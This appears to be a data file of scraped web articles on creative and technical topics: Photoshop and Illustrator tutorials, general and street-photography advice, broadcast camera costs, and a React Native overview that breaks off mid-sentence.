      "text": "Create an Emotional Photo Manipulation in Photoshop \nJenny Le \n| February 9, 2016 | \nEffects \nIn this Photoshop tutorial I\u2019ll show you how to create a beautiful field scene featuring an emotional girl. \nYou\u2019ll learn how to combine different stock images using adjustment layers, masking and brushes. You\u2019ll also learn how to adjust color, enhance the atmosphere and create lighting effects. \nFinal Image \nTutorial Details \nProgram : Photoshop CS3+ \nEstimated Completion Time : 90 minutes \nDifficulty : Intermediate \nResources \nStep 1 \nCreate a new 1200\u00d7800 px document in Photoshop with the settings shown below: \nStep 2 \nOpen the sky image. Drag this image into the white canvas using the Move Tool (V) : \nStep 3 \nTo reduce the noise in the sky, go to Filter > Noise > Dust & Scratches : \nStep 4 \nGo to Layer > New Adjustment Layer > Color Balance (set it as Clipping Mask ) and change the Midtones settings: \nStep 5 \nMake a Curves adjustment layer and decrease the lightness. On this layer mask, select a soft black brush to erase the middle left to reduce the effect there: \nStep 6 \nOpen the field image. Use the Retangular Marquee Tool (M) to select the field only and place it in the lower half of the main document as shown below: \nClick the second icon at the bottom of the Layers panel to add a mask to this layer. Use a soft black brush to soften the edge in the horizon area: \nStep 7 \nUse a Curves adjustment layer (set as Clipping Mask ) to darken the field. On this layer mask, use a soft black brush with a low opacity (about 10-15% ) to erase the left corner as we aim to add light there. \nStep 8 \nMake a Color Balance adjustment layer on top of the layers and change the Midtones and Highlights settings: \nOn this layer mask, use a soft black brush to erase the field area as I don\u2019t want it to be affected by this adjustment layer: \nStep 9 \nCreate a Curves adjustment layer to brighten the scene. On this layer mask, select a soft black brush and paint over the right side to make the light visible on the left: \nStep 10 \nOpen the model image. First isolate her from the background using your own method: \nStep 11 \nMake two new layers and use a hard brush with two colors #764d3b and #eec19a to paint more hair for the model: \nStep 12 \nMerge all the hair layers and the model layer by pressing Ctrl+Shift+Alt+E while turning off the background and the fill layer below the extracted model layer. \nMove her into our field scene and place her in the middle of the ground and flip her bright side to the left ( Edit > Transform > Flip Horizontal ): \nStep 13 \nAdd a mask to this layer and use a hard black brush to trim the bottom of the model\u2019s dress and make her look like she\u2019s standing between the grass blades: \nStep 14 \nUse a Hue/Saturation adjustment layer to change the model\u2019s dress color to make it fit the grass: \nStep 15 \nOn a separate layer, use a hard brush with the color #4a1f15 to paint more hair for the model. \nStep 16 \nMake a new layer on the top. Change the brush kind to the petal ones and select the one you like. Press F5 to change the settings of this brush: \nPaint random, flying petals over the picture: \nStep 17 \nPaint some bigger petals on the edges of the scene as shown below: \nStep 18 \nGo to Filter > Blur > Gaussian Blur and set the radius to 4 px. This step is to add some depth to the scene. \nStep 19 \nCreate a Curves adjustment layer on top of the layers: \nStep 20 \nUse another Curves adjustment layer and reduce the lightness. Paint on the layer mask on the left side to maintain the lightness there: \nStep 21 \nMake a Brightness/Contrast adjustment layer and increase the Contrast value to 18 : \nStep 22 \nTo add light to the scene, create a new layer and paint on the left side with the color #2a1a01 . Change the layer mode to Linear Dodge 100% : \nStep 23 \nMake a new layer and change the mode to Overlay 100% . Use a soft brush with the color #d7ab67 to make the light stronger: \nStep 24 \nGo to Layer > New Fill Layer > Solid Color and pick the color #7f6240 . Lower the opacity of this layer to 20% and use a soft black brush on the layer mask to remove the effect on the sky part and the left side: \nStep 25 \nUse a Vibrance adjustment layer to enhance the final effect: \nAnd We\u2019re Done! \nI hope that you\u2019ve enjoyed the tutorial.",

      "title": "Concise Photography Advice for Friends and Family",
      "text": "\u201cDo you have any advice on how to take good photos?\u201d Because I don\u2019t make a secret of my interest in photography, it\u2019s not uncommon for people around me to assume that I\u2019m the right person to answer this seemingly innocuous question. \nIt doesn\u2019t really help when I try to explain embarrassingly that I\u2019m just an amateur and most likely the last person to dispense photography-related morsels of wisdom. So I thought I could just as well distill my meager photography experience into a few simple points I can share with people seeking my advice 1 . \nFor most people, photography exists in the context of recording important events and travel experiences. So I have these two scenarios in mind when I talk about taking good photos. \nI\u2019ll be the first to admit that what I offer is often gross simplification, but my advice is based on the assumption that people want actionable info and not a philosophical discussion on the finer points of photography. \nSo let\u2019s start with the most important question. \nWhat is a good photo? \nFor the sake of simplicity, we assume that a good photo either adequately illustrates the story you want to tell, and/or provokes an emotional response from the viewer. \nFrom the technical point of view, a good photo doesn\u2019t suffer from over- and underexposure (i.e., the photo is too bright or too dark), and it doesn\u2019t contain obvious flaws like an uneven horizon, unnatural pose or expression, and lack of a strong subject. A good photo also includes all the elements relevant to the story you want it to tell. \nWhat do I photograph? \nTake photos of what you find interesting or what provokes an emotional response. Remember that you are not taking pictures of things and people, you are capturing experiences. \nWith people, you would want to capture emotions. \nHow do I photograph? \nDecide what you want to photograph, then ask yourself, \u201cWhy do I want to take a photo of this particular subject or scene?\u201d \nIdentify what attracted you to the scene or subject in the first place, then try to make it the main subject of your photo. \nWhen photographing people, don\u2019t inform them that you are going to take pictures of them, and then ask them to act natural. \nWait till people show emotions you want to capture and then take photos at will. \nAvoid cramming the entire figure into the frame. \nDon\u2019t hesitate to move closer to the subject. \nFocus on the eyes, capture the smile. \nComposition \nThe main purpose of the composition is to prevent the viewer\u2019s eye from aimlessly wandering around the frame. A strong composition leads the eye and then keeps it firmly focused on the main subject. To oversimplify, the composition answers two questions: \u201cWhat do I want the viewer to look at?\u201d and \u201cHow can I make my photo pleasing for the viewer?\u201d \nFollow simple rules to improve your composition. \nDecide what the main subject is and make it the dominating element of the photo. \nUse the rule of thirds . Enable the grids in your camera, then use them to place the main subject where the lines intersect to achieve a more dynamic composition. Also, use the lines to move the horizon to the upper or lower third of the frame to make the image more dynamic. \nIf you find the rule of thirds tricky to master, just avoid placing the main subject in the center of the frame. \nSimplicity is better than complexity. Reduce the number of elements in the frame to an absolute minimum. \nWatch out for unwanted objects at the borders of the frame (random people, stray tree branch, etc.). \nWhen photographing moving objects (cars, birds, etc.). give them some space to move through the frame. Place the moving subject at the opposite end of where it will be exiting the frame. \nDon\u2019t shoot everything from the eye level. Use your body when taking photos. \nGo low for photos of city streets, small children, and animals. \nLook up for interesting photos of buildings. \nStretch your hands to take photos from above. \nUse your feet instead of zoom. Walk around to find different angles. \nPay attention to the background. If the background is part of the composition, make sure that it doesn\u2019t clash with the main subject. To de-emphasize the background (especially for portraits), use plain walls in muted colors or open spaces. \nLight \nIn most situations, position yourself so that the sun is behind you. \nMake sure that stray shadows (including your own) and reflections don\u2019t fall on your main subject. \nAvoid high-contrast scenes with too dark and too bright areas in the same frame. \nMake sure that the main subject is properly exposed (i.e., it\u2019s neither too dark nor too bright). \nAvoid scenes, where the light source is behind the subject. \nOn a sunny day, take photos in the late afternoon (an hour or so before sunset) or early morning right after sunrise. \nWhat else? \nDisable the built-in flash. \nRemember to back up your photos. \nWhat software should I use? \nI\u2019m biased , but give digiKam a try. It\u2019s available free of charge, and it runs on macOS, Windows, and Linux. More importantly, it has all the essential tools for importing, organizing, processing, and managing photos, RAW files, and videos. \n1 Being lazy, I thought I could get away with simply googling the topic and compiling a list instead of writing the whole thing from scratch. However, while there is an abundance of articles catering to beginners, they often dispense advice that is hardly of practical use for mere mortals. I mean shoot RAW, understand the exposure triangle, learn to read the histogram, and don\u2019t overexpose highlights is not exactly what your aunt expects to hear when she asks you for advice. \nAbout the author : Dmitri Popov is an amateur photographer and tech writer.

      "title": "Street Photography 101: Shooting from the Hip",
      "text": "In this article, I\u2019m going to share my basics of shooting from the hip, a fun way to get candid, up-close street photos. We\u2019ll cover camera settings, what to look for, and other techniques along the way. Let\u2019s get into it! \nWhy Shoot From the Hip? \nShooting from the hip isn\u2019t easy, but it can be practiced and honed to increase your keepers. \nThis style of shooting has several benefits, but it also has some drawbacks. One of the major drawbacks is that you\u2019re not using the viewfinder or LCD to line up your shot, so you\u2019ll have about 80-90% bad photos. This isn\u2019t really an issue if you don\u2019t mind sifting through the garbage to find a gem, or you\u2019re shooting digital and have enough storage on your computer. You\u2019ll also have several crooked images, but just think of Garry Winogrand and his style. A great image doesn\u2019t have to be perfectly perpendicular. \nAside from those minor drawbacks, the benefits are exciting and it\u2019s really fun! A lot of street photographers have shy tendencies, so shooting from the hip can ease some tension and allow them to capture subjects a little closer. The chances of someone confronting you for taking a photo are slim to none. The only time you\u2019d experience any issues is if they somehow hear a loud shutter clapping at them, or you\u2019re being too direct when you point your camera. \nEven though you\u2019re shooting from the hip, you still have to practice incognito behaviors like pretending to talk on your phone, pretending to use your phone as GPS (I used this a lot in Paris), or turn your head the other way while you shoot. Sunglasses help with the last one! All of these methods throw off your subject and make your intentions more camouflaged. \nAnother great benefit of shooting from the hip is that it requires minimal effort when getting a unique perspective. If you\u2019ve ever seen Bruce Gilden photograph in the streets, he\u2019s up and down, up and down, bobbing and weaving all day trying to get a unique perspective. When you shoot from the hip you\u2019re mostly just working your wrist and \u201ctrigger finger\u201d as you walk around. We\u2019ll cover more on unique perspectives later, but here\u2019s a photo that looks like it was taken while squatting down, but it was from the hip with my arm to my side. \nShooting from the hip also gives you another tool to use when you need. Typically I like looking through the viewfinder or using the LCD to compose a shot like these next few photos, but you can\u2019t do this safely and without confrontation in seedy neighborhoods or with potentially dangerous subjects. \nNote : The three images to follow were composed by using the LCD. All of the photos in this article are just as they were shot; no manipulation or heavy editing, no cropping, no dodging or burning. Not to say they don\u2019t need a little more finesse, but this is to give you an idea of what you can expect when you go out shooting from the hip for yourself. \nTo give you an idea of the seedy neighborhoods I\u2019m referring to, I\u2019ll give you some details from a time when I visited Montmartre, in Paris. This is the \u201cbohemian\u201d neighborhood where Moulin Rouge is, alongside pubs and sex shops. I ended up in a neighborhood full of poverty and what looked like potential drug-dealing territory. If you watch enough movies and TV, you start to gather ideas of what these neighborhoods might look like; even if they are exaggerated for cinematic entertainment. \nI was able to capture one subject in a sequence who I call \u201cscarface\u201d because of his massive scar. Would you want to ask him for a portrait or be caught taking his photo? Ok, maybe those pink Nike slippers aren\u2019t too intimidating for most of you, but it\u2019s probably safer to just shoot from the hip and keep moving. \nHere\u2019s the full sequence, but we\u2019ll cover more on that in a bit. Notice how he follows me the whole time! When I was walking around with my large DSLR and zoom lens in the safer neighborhoods of Paris, I still got the evil eye from people and they noticed my camera right away. With small cameras like the Ricoh GR III , no one seems to notice or care, thankfully. \nThe other photos taken in this poverty-stricken neighborhood will give you an idea of what I saw and why I shot from the hip. Here\u2019s a guy selling \u201cprobably stolen\u201d necklaces and watches. \nHere are several more that capture the neighborhood well. \nShooting from the hip allows you to have fun with street photography without worrying about the confrontation. You can even take this technique into stores or museums. Here\u2019s a shot of an older gentleman checking his watch in the Musee d\u2019Orsay. \nCamera and Settings \nFor all of the photos in this article, the Ricoh GR III was used. It has a 28mm equivalent lens, which is great for crowds or getting close to people. We can see how close I was able to get in these next photos. And since a major goal for most street photographers is to blend in, get close to the subject, remain unnoticed, and capture an authentic moment in time that wasn\u2019t manipulated, this method of shooting from the hip works perfectly. \nThe Ricoh camera is so small that it fits in your pocket, but other cameras can be used. Just be aware that the bigger the camera and lens, the more you draw attention to yourself. Not to mention the incremental fatigue that comes with walking around with heavier equipment. If you can get away with shooting from the hip with a Canon 1DX Mark II then go for it! You\u2019ll probably get some great photos if your arm doesn\u2019t fall off. \nOther street photographers sit in the shadows and wait for subjects to be ensnared in their composition, as seen in the next photo. Both styles are great, but shooting from the hip works best for an up-close-and-personal style. If you\u2019ve been hiding in the shadows because you\u2019re shy of confrontation and would like to get closer to the subjects, try shooting from the hip. Practicing both styles will only make you a more balanced photographer; yin and yang. \nThe camera settings I typically use to get a proper exposure with the Ricoh GR III are f/5.6, 1/1000, auto ISO. This is with the 28mm equivalent lens, and outdoors with cloud coverage or sunlight. The aperture of f/5.6 gives you enough depth of field, the shutter speed of 1/1000 is fast enough to freeze the moving subject, and auto ISO helps complete the exposure as the lighting scenario changes. If you\u2019re shooting in a dark alley you might have to adjust the shutter speed to 1/250 to keep the ISO low, but this means the subject can\u2019t be moving as fast. \nIn this next up-close photo, you can see how the woman in the foreground is slightly blurry and the woman in the background is in focus. Since the Ricoh GR III has a wide lens, the depth of field still allows the image to work because both subjects can be identified. If the camera were focused on the woman in the foreground, the woman in the background would be blurred out. \nBe sure to turn off your LCD because you won\u2019t be using it and you can save battery life. Nothing is more frustrating than running out of batteries halfway through your street session. Put the shutter drive on burst mode instead of single shot. Doing this will increase your chances of capturing a nice sequence. We\u2019ll cover more on sequences soon. \nChimping \nAs you venture out into the day with your camera, be sure not to continually check the photos you capture (a.k.a. chimping). It\u2019s a smart idea to double-check your settings for the first few photos, but to stand there in the street and look at each image can ruin the fun. You can even get discouraged and ruin the thrill of the hunt if you see an interesting subject, shoot a sequence, chimp, then realize you missed the shot. \nThat\u2019s what happened for this next shot. I chimped shortly after I took it and realizing that I cut off a head was a major let down. \nWhen you chimp, you also waste battery life, something you definitely want to preserve with the Ricoh GR III and most compact cameras. Additionally, you will most likely allow a great shot to pass you by if you\u2019re constantly chimping during your session. \nJust save the instant gratification for later, and enjoy yourself in the moment; unlike the bored couple in this next photo. \nHand Positions \nThere are two main hand positions you can use to capture subjects all around you. If you\u2019re right-handed you\u2019d hold the camera on your right side pointing outward to the right, with your arm relaxing (if you\u2019re left-handed just do the opposite). This will capture subjects in front and to the right of you. There\u2019s a diagram to follow. \nNote : As you walk with the camera by your side you\u2019ll be creating movement with your stride, so just be mindful of this and try to hold your arm more still. Just don\u2019t look too awkward or robotic because that might clue people in on your intentions. Just be as subtle as you can be. \nIn this same position, you can even walk past someone and twist your wrist backward and tilt the camera up. That\u2019s how I got this next shot. \nThe other way to hold the camera right-handed is to position it at hip level, arm bent, and pointing towards your left. This will capture subjects in front of you and on the left side. In both positions, just twist your wrist forward to capture the subjects in front of you. Here\u2019s a quick diagram showing the different hand positions. \nThis mirror shot will show you how I\u2019m holding the camera by my side and turning it forward. \nBoth hand positions naturally produce vertical photos, but the camera can be turned to create horizontal ones. It just looks more obvious when you do it this way. You\u2019ll notice that most of the photos here are vertical, which makes it possible to capture the full body of the subject. \nInteresting Perspectives \nAs you walk around, be sure to notice the buildings above you, clouds, trees, anything that you typically might have overlooked while typically shooting through the viewfinder. These higher objects will be prominent elements of your composition, which is great because it adds an interesting perspective to the final design. If you like the clouds above, just get closer to the subject and tilt your camera upward more. \nYou\u2019ll have to do an extreme tilt upwards with high subjects like this young girl chowing down riding on her dad\u2019s shoulders. \nYou can do a tilt downward for subjects like dogs, or this yellow puddle splash and foot. Most likely dog urine, yeesh! \nScouting Your Subject \nAlways be on the lookout for whatever interests you in the people you see in the streets. Scan the crowds for this specific interest constantly and once you see it, try to position yourself in the correct place. Sometimes you can walk towards them, then cut in front of them to get a better position. We can see that in this next photo. \nOr this one, where I\u2019m coming straight at the subject, then cutting in front. The things that interested me in this one was the fashion, the colors of the scene, and the father leading his child through the crowded streets. \nSometimes you\u2019ll get lucky enough to identify a juxtaposition, where the subjects in the foreground and background are united. \nCapturing Sequences \nWhat are we doing, \u201cspray-and-pray\u201d photos now? Not really because the intentions are more focused than that. We know what we want, we\u2019re hunting for it, we\u2019re positioning ourselves and the camera in the appropriate spot, looking above and below for design elements, thinking about diagonals, colors, gestures, the decisive moment, tons of stuff. The burst mode setting for your camera is just another tool we can use, like the LCD or auto white balance, to capture the image as we hope. \nKnow your camera. Some cameras can\u2019t process a burst of RAW images very fast (buffering), so if you\u2019re always exhausting your camera, you\u2019re bound to miss a more interesting subject after the first burst. Your camera won\u2019t be able to keep up if you\u2019re holding down the shutter button three subjects in a row, so be selective. \nTo capture a decent sequence as you walk past someone, try not to follow them by turning your wrist; at least not until you get the feel of shooting from the hip. Your hand-eye coordination probably won\u2019t be as good as you hope, no matter how many video games you\u2019ve played, so it usually makes you miss more photos than anything. \nInstead, aim the camera in their direction, about 45 degrees from center, and hold down the shutter button as you pass by. This was diagrammed above in the \u201chand position\u201d section. A simple wrist or body twist works when you\u2019re standing still and the subject moves past you. You\u2019ll find what works for your own process as you continue to practice and analyze your photos. Make lots of mistakes so you can learn from them! \nIn this next sequence, I noticed the pretty girl with a cute dog in her purse. I aimed the camera, tapped my shutter button to focus, then held it down as we passed each other. You can see how the focus gets softer as she gets closer, but with the wide-angle lens and aperture of f/5.6, it doesn\u2019t really matter (opinions on perfect focus vary though). You can play around with different focus settings, but I find the center focus best for my style in busy environments. Also, I welcome a little inconsistency when it comes focus. \nThis is the image I selected from the sequence. The lens flare adds a nice sense of atmosphere (see aerial perspective), while the balance and proximity to the subject seem to work better than the others. \nHere\u2019s another one where I noticed the two ladies talking and was able to capture a nice sequence. \nIn this case, the last image works best because it still has the gesture, facial expression, and fills the frame more. \nSorting and Selecting the Best \nSorting through the junk images is the best learning experience. The disappointment of missing a sequence also helps you learn from mistakes. As you capture photos on the walk to work or to the grocery store, try and sort them on the same day. Get home, transfer the files, then go through and rate them 1-5 stars. This is what I do in Adobe Bridge. Sorting and rating photos will make you incrementally get better because you\u2019re making note of areas you can approve; tilt up more, hold the camera more steady, double-check your settings, etc. \nWithin each sequence, you\u2019ll have maybe four images of the subject, but only one will be better than the rest. Sometimes it\u2019s not easy to select the best either. This is when knowledge of composition and design techniques comes in handy. Base your ratings and selections on things like balance, nice figure-ground relationship, gestures, dominant diagonals, dynamic symmetry, story, lighting, filling the frame/grid, etc. \nIn this next sequence, can you see how the image on the left has her camera/arm overlapped onto the building in the background, while the image on the right has her right shoulder going out of the frame? Only the one in the middle has a nice figure-ground relationship, where she fits nicely into the background. Almost like a puzzle piece, or a pocket of negative space. Look for slight differences like this in your sequences and you\u2019ll surely pick the best image. \nWhen it comes to nice lighting, try to know your environment. In Paris, it was cloudy most of the day, but then the sun would pop out around 4pm-6pm. This allows you to capture the subject in beautiful ways with rim light, shadows, bright orange faces, etc. \nBright and interesting colors always make for great additions to an interesting subject, and we can see various combinations in these next photos. \nConclusion \nAre you feeling inspired to try and shoot from the hip during your next street photography session? Give it a try! Add some yin to your yang. Use your knowledge of composition and design techniques to guide you as you hunt for your subject, and also as you sort the cream of the crop. Avoid chimping, and know your environment. \nThanks so much for joining in, see you next time! \nAbout the author : Tavis Leaf Glover is a fine art photographer and author based in Honolulu, Hawaii.

      "text": "Since Halloween is just around the corner, we thought it would be nice to give you an early treat in the form of this spooky Friday the 13 th inspired halloween emoji icon. That being said, pour yourself a fresh cup of that magic bean juice and let\u2019s get started! \nTutorial Details: Halloween Emoji Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2017 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 30 Minutes \nFinal Image: Halloween Emoji Icon \nStep 1 \nAs always we\u2019re going to kick things off by setting up a New Document by going over to File > New (or using the Control-N keyboard shortcut), which we will adjust as follows: \nNumber of Artboards: 1 \nWidth: 128 px \nHeight: 128 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size (Width x Height). \nStep 2 \nStart by creating the halloween emoji icon\u2019s main body using a 116 x 116 px circle, which we will color using #FFCC66 , and then center align to the underlying Artboard . \nStep 3 \nAdd the mask\u2019s fill shape using a 96 x 116 px ellipse, which we will color using #FFF2E1 , and then center align to the larger shape from the previous step. \nStep 4 \nGive the shape that we\u2019ve just created an outline using the Stroke method, by creating a copy of it ( Control-C ) which we will paste in front ( Control-F ) and then adjust by first changing its color to # 5B3B33 , and then flipping its Fill with its Stroke ( Shift-X ) making sure to set its Weight to 4 px from within the Stroke panel. Once you\u2019re done, select and group the two shapes using the Control-G keyboard shortcut. \nStep 5 \nStart working on the left eye, by creating its main body using a 16 x 16 px circle ( #FFFFFF ) with a 4 px thick outline ( #5B3B33 ), which we will group ( Control-G ) and then position onto the halloween emoji icon mask, at a distance of 18 px from left edge and 40 px from its top one. \nStep 6 \nAdd the pupil using a smaller 8 x 8 px circle, which we will color using #5B3B33 , and then center align to the shapes that we\u2019ve just grouped. \nStep 7 \nCreate the little circular highlight using a 4 x 4 px circle ( #FFFFFF ), which we will align to the halloween emoji icon pupil\u2019s top right corner as seen in the reference image. Once you\u2019re done, select and group ( Control-G ) all of the eye\u2019s composing sections before moving on to the next step. \nStep 8 \nCreate the right eye using a copy ( Control-C > Control-F ) of the one that we\u2019ve just finished working on, which we will position onto the right side of the halloween emoji icon mask, at a distance of 16 px from the original. \nStep 9 \nTake a couple of moments, and add in the little cutouts to the mask upper section, using a group of six 8 x 8 px circles ( #5B3B33 ), which we will position as seen in the reference image, making sure to distance them at 4 px from one another both horizontally and vertically. \nStep 10 \nAdd the bottom cutouts using nine 8 x 8 px circles ( #5B3B33 ) which we will position as seen in the reference image. Take your time and once you\u2019re done, select and group all of them together using the Control-G keyboard shortcut. \nStep 11 \nGrab the Pen Tool (P) and using #F47867 as your main Fill color, draw the halloween emoji icon mask\u2019s three decorative decals. Take your time, and once you\u2019re done select and group ( Control-G ) all of the mask\u2019s composing sections before moving on to the next step. \nStep 12 \nCreate the halloween emoji icon strap\u2019s side segments using two 22 x 16 px rectangles ( #915D53 ) with a 4 px inner facing Corner Radius and a 4 px thick outline ( #5B3B33 ), on top of which we will add the bolt using a 4 x 4 px circle ( #5B3B33 ). Once you\u2019re done, individually group ( Control-G ) and position each of the strap segments onto the sides of the mask as seen in the reference image. \nStep 13 \nCreate the top halloween emoji icon strap segment using a smaller 16 x 16 px square ( #915D53 ) with a 4 px bottom Corner Radius . Give the shape the usual 4 px thick outline ( #5B3B33 ) followed by the 4 x 4 px circle ( #5B3B33 ), grouping ( Control-G ) and then positioning all three shapes to the upper edge of the mask. \nStep 14 \nSelect and group ( Control-G ) all three halloween emoji icon strap segments together, masking them afterwards using a copy ( Control-C ) of the underlying yellow circle, which we will paste in front ( Control-F ) and then simply right click > Make Clipping Mask . \nStep 15 \nFinish off the halloween emoji icon and with it the icon itself by adding the outline ( #5B3B33 ) to its larger body (the yellow circle), making sure to select and group ( Control-G ) all of its composing sections together before hitting that save button. \nIt\u2019s a Wrap! \nAs always I hope you\u2019ve managed to follow each and every step, and most importantly learned a new trick or two along the way. That being said I wish you all a happy trick or treating! \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post How to Create a Spooky Friday the 13th Halloween Emoji Icon appeared first on Vectips .",

      "text": "This is why TV cameras are still huge and ridiculously expensive \nDecember 6, 2019 by John Aldred Leave a Comment \nVIDEO \nOver the past couple of decades, very high-quality video-capable cameras have down a lot in both price and size. So, why then, are the camera setups used for shooting broadcast TV content still so huge? and why are they so expensive? \nIn this video, Zebra Zone breaks down exactly what\u2019s involved in these types of setups, exactly why they\u2019re needed and why they cost as much as a house. He also busts a big myth that it\u2019s the camera that\u2019s huge. Much of the bulk and cost are the extras bolted onto it. \nThe setup shown in the video comes to a total cost of around $250,000. That\u2019s a hell of a lot of money, but almost 90% of that cost is the lens attached to the camera, which is just a $3,500 Blackmagic URSA Broadcast camera . The tripod and fluid head alone come in at almost six times the cost of the camera, at around $20K. The remote control handles, lens adapter, monitor and fibre optic transmission module total up to around another $21K. \nCamera: $3,500 \nLens: $212,000 \nTripod & Fluid head: $20,000 \nRemote handles: $9,000 \nFiber module: $3,000 \nMonitor: $1,800 \nTotal: $249,300 \nAs explained in the video, in traditional video setups, what you shoot is based on the gear you have available to you. You adapt your environment to your kit. In broadcast, it\u2019s the other way around. Your gear needs to be able to adapt to any environment it finds itself in. This could mean everything from talk shows to sports coverage. And kit that can adapt to just about any environment is very expensive (and huge). \nThe lens shown in the video is a Fujinon 4K UHD 8.4-900mm f/1.7 4K . It\u2019s packed with so many features it\u2019ll make your head spin. But the biggest is that it\u2019s parfocal . There\u2019s no need to refocus your shot as you zoom in and out, which is vital, especially on a live broadcast. It also features built-in image stabilisation, it\u2019s razor-sharp across its entire focal length, and it can go from minimum to maximum very quickly. Oh, and it has a built-in 2x teleconverter, giving it a final range of 8.4-1800mm. \nWe look at those $10K cinema lenses and think they\u2019re amazing, and even those are out of the reach of many low budget filmmakers. But even those are nothing compared to something like this. Something so big that it requires external controllers for adjusting focus and aperture. Not optional extras, like throwing a follow focus on a cinema rig, but actually required as part of its operation. \nBut it\u2019s nice to know that even if we can\u2019t afford or justify the types of lenses they use for broadcast work, the cameras at least are attainable for even lower budgets.",

      "title": "Why Choose React Native For Mobile Development + Tutorial On How To Start An App",
      "text": "How to Build a React Native App \nIt\u2019s obvious that in the year 2019 having a mobile application is necessary for your business. I will not mention that on the intro. \nLet\u2019s go straight to the essence of the article. Before we dive deep into the React Native tutorial, let\u2019s do a quick overview of the mobile development frameworks and technologies that stay alive in 2019. \nHere\u2019s a list of technologies that are used in modern mobile apps: \nNative languages for Android and iOS (Java/Kotlin, Objective\u200a\u2014\u200aC, Swift) \nReact Native \nApache Cordova and Cordova Tools (PhoneGap, Ionic, etc.) \nXamarin \nFlutter \nShortly, there are three major types of mobile app development in 2018: Native App Development, Hybrid Development, and Cross-Platform Development. \nIf we briefly analyze the popularity of technologies that allow using one codebase for several platforms, we can see that React Native is in the first place. \nIn this article we will help you choose the right technology for your idea and show you how to start developing a simple React Native application. \nThe Pros and Cons of Other Technologies \nHere I will describe some other technologies and note their good and bad points: \nNative Mobile Development \nA native mobile app is a smartphone application that is coded in a specific programming language, such as Objective C/Swift for iOS or Java/Kotlin for Android operating systems. Native mobile apps provide fast performance and high reliability. However, this app type is expensive to develop because it is tied to a single operating system type. \nPros: \nSupports all APIs \nPerformance \nLarge community \nErrors are easier to detect (because of strict language) \nCons: \nTime-consuming \nNecessitates hiring talent \nSeparate codebase \nNo reusable code \nCordova \nApache Cordova enables software programmers to build applications for mobile devices using CSS3, HTML5, and JavaScript instead of relying on platform-specific APIs like those in Android, iOS, or Windows Phones. It enables wrapping up of CSS, HTML, and JavaScript code depending upon the platform of the device. The resulting applications are hybrid, meaning that they are neither truly native mobile applications nor purely web-based. \nPros: \nEasy and quick to prototype \nSmooth web developer\u2019s transition to mobile development \nOffline usage \nEasier to create vector graphics to design specs \nCons: \nSlow data processing \nLimited API support \nSupporting different devices can become a nightmare \nXamarin \nXamarin is a framework for developing a cross-platform mobile application using C#. Xamarin provides a single language C# and runtime that works on three mobile platforms (Android, iOS, and Windows). With Xamarin we make a mobile application which looks and feels completely native. You can write one C# codebase which will have access to all features available for native SDK. \nPros: \nFaster development cycle \nClose to native app performance \nNative user-experience \nCons: \nLarge operational software overheads \nCore user-interface creation is not portable \nThe code developed in Xamarin App Development cannot be reused or transferred to HTML5 or native applications for iOS or Android \nFlutter \nFlutter is an open source SDK for creating high-performance, high-fidelity mobile apps for iOS and Android. With a rich set of Material Design and Cupertino (iOS) widgets and behaviors, Flutter makes it easy to start building beautiful apps. You\u2019ll write your Flutter apps in Dart. Dart syntax should look familiar if you already know Java, JavaScript, C#, or Swift. Dart is compiled using the standard Android and iOS toolchains for the mobile platform your app needs to run on. \nPros: \nCross-platform \nHot reload \nLess code because of Dart (strongly typed language) \nOfficial Google support \nCons: \nA relatively new framework \nMobile only \nDart is unpopular so the community is small \nGoogle has a bad history in building new projects \nReact Native \nReact Native is a framework that builds a hierarchy of UI components to build the JavaScript code. It has a set of components for both iOS and Android platforms to build a mobile application with a native look and feel. \nPros: \nSingle codebase \nSmooth web developer\u2019s transition to mobile development \nReusable components \nLow development costs \nLess time expenses \nCons: \nEach platform has specific design guides \nPerformance issues \nNative API support (requires knowledge of native languages) \nLimited access to OS features (requires knowledge of native languages) \nWhy choose React Native? \nLet us show exactly why using Native React mobile apps development is a great idea nowadays\u200a\u2014\u200asometimes even better than native development. \nMobile development has witnessed unprecedented growth. According to Statista , mobile applications will generate an estimated 188 billion U.S. dollars in revenue via app stores, advertising and in-app purchases by the year 2020. \nSingle and business users require high-standard apps with flawless performance, multiple screens, easy navigation and good design. \nOn the other side, high-performing, good quality native apps are very time-consuming to develop compared to cross-platform apps that provide faster development but compromise on performance and support. \nReact Native seems to be a viable solution for building high-quality apps in a short time with the same performance and user-experience standards that native apps provide. \nCompanies that developed apps in the past had to assemble and manage two teams and two different codebases. This led to separated teams and slower build times. With Mobile UI frameworks like React Native, engineers can code for both platforms using one language with one codebase. \nReact Native apps are compiled into natively written code, which enables React Native to not only work on both operating systems, but also have same features on both platforms with no lag. \nAnother significant advantage of using React Native is Live Updates. With the extensive use of JavaScript developers are able to push the updates directly to the users\u2019 phones instead of going through the app store update cycle. \nReact Native will also increase your talent pool: developers are able to build mobile apps using Javascript. Javascript is quite common among front-end engineers and relatively easy for back-end engineers to pick up. This way more front-end engineers get an opportunity to try their hand at mobile development for the first time. \nHere\u2019s a little fly in the ointment: developers will still need to write native code. React Native is a great choice for simple applications where the APIs have a clear bridge between two platforms. \nEventually, the APIs will inevitably stop operating exactly the way you want, and to make the necessary adjustments you\u2019ll have to dive into the native libraries anyway. \nIf you hire a JavaScript developer to work on your React Native project, you can easily expect him to write native code and bridge the existing gaps in functionality. \nTutorial on how to start a Project on React Native \nPrerequisites \nTo be able to follow this tutorial, you have to be familiar with React and have a solid JavaScript knowledge. Even if you have no previous experience with React, you will be able to follow it. In this tutorial we will explain some fundamental React concepts. \nChoose your development tools. The best config of dev tools to quickly start developing on React Native is: \nVisual Studio Code with React Native Tools\u200a\u2014\u200aA Visual Studio Code extension that provides a development environment for React Native projects. Using this extension you can debug your code, quickly run react-native commands from the command palette and use IntelliSense to browse objects, functions, and parameters for React Native APIs. \nExpo is a toolchain built around React Native to help you build native iOS and Android projects using JavaScript and React. Expo enables you to build cross-platform native apps using only JavaScript. Use your favorite text editor to write powerful React Native components without ever opening Xcode or Android Studio. \nUse Sketch for designing screens and Instabug for debugging apps and error monitoring. \nStart of a project \nThere are a couple of things you need to install to set up the environment for React Native. I use OSX 